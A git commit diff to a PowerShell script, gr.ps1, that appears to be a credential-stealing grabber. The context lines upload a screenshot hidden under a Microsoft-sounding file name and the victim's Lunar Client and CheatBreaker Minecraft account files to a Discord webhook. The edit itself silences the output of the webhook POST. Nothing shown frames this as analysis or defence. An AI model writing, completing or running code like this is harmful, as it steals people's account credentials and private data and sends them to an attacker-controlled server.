f8ef71ab04e61b9a91b7eb406f15f2091e7702fd
Appolon <93398824+Appolon24800@users.noreply.github.com>
2023-02-22 19:09:21 +0100

    Update gr.ps1

--- gr.ps1
+++ gr.ps1
@@ -150,7 +150,7 @@ Upload-Discord -text "||<@767438758902759494>||"
 Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
-Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json' -Quiet
+Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json' | Out-Null
 Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
